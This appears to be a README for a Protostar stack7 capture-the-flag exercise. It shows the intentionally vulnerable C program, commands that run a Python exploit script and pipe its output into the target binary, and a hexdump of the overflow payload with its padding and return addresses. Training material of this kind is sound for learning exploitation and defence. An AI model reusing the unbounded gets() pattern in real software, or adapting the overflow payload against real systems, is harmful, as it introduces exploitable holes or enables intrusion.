## [Source code](https://exploit.education/protostar/stack-seven/#source-code)
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
----------------------------------------------------------------------

## Option one
_Run the script._
```bash
python Exploits-for-Protostar/stack7/stack7.py
```

## Option two
_Save exploit into a file, and use it as input._
```bash
python Exploits-for-Protostar/stack7/stack7.py --save
(cat Exploits-for-Protostar/stack7/exploit_stack7; echo; cat) | /opt/protostar/bin/stack7
```
----------------------------------------------------------------------

## hexdump of exploit_stack7 should look like this:
```s
  Offset: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 	
00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000030: 41 41 41 41 41 41 41 41 41 41 41 41 00 00 00 00    AAAAAAAAAAAA....
00000040: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000050: 44 85 04 08 B0 FF EC B7 C0 60 EC B7 BF 63 FB B7    D...0.l7@`l7?c{7

```
